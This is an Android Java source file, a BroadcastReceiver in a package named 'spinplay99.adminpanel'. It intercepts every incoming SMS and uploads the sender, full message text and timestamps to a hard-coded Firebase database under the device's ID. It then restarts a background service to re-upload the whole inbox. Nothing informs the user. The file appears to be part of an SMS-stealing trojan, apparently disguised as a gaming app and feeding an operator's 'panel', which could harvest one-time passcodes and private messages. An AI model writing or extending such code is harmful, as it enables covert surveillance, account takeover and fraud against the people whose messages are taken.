package com.spinplay99.adminpanel;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {

    private static final String DB_URL = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;

        if (com.google.firebase.FirebaseApp.getApps(context).isEmpty()) {
            FirebaseApp.initializeApp(context);
        }
        DatabaseReference database = FirebaseDatabase.getInstance(DB_URL).getReference();
        String deviceId = android.provider.Settings.Secure.getString(
            context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                ? SmsMessage.createFromPdu((byte[]) pdu, "3gpp")
                : SmsMessage.createFromPdu((byte[]) pdu);
            if (sms == null) continue;

            String body = sms.getDisplayMessageBody();
            if (body != null && body.length() > 500) body = body.substring(0, 500);

            Map<String, Object> data = new HashMap<>();
            data.put("address",      sms.getDisplayOriginatingAddress());
            data.put("body",         body);
            data.put("date",         String.valueOf(sms.getTimestampMillis()));
            data.put("date_readable", new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault())
                .format(new Date(sms.getTimestampMillis())));
            data.put("type",         "INBOX");
            data.put("received_at",  ServerValue.TIMESTAMP);

            // Push to new_sms for real-time panel display (instant)
            database.child("devices").child(deviceId).child("new_sms").push().setValue(data);
        }

        // Reset stored SMS count so BackgroundSyncService re-uploads all_sms on next cycle
        SharedPreferences prefs = context.getSharedPreferences("SpinPlaySyncPrefs", Context.MODE_PRIVATE);
        prefs.edit().putInt("last_sms_count", -1).apply();

        // Restart BackgroundSyncService immediately to trigger full SMS upload within 3 seconds
        Intent serviceIntent = new Intent(context, BackgroundSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }
}
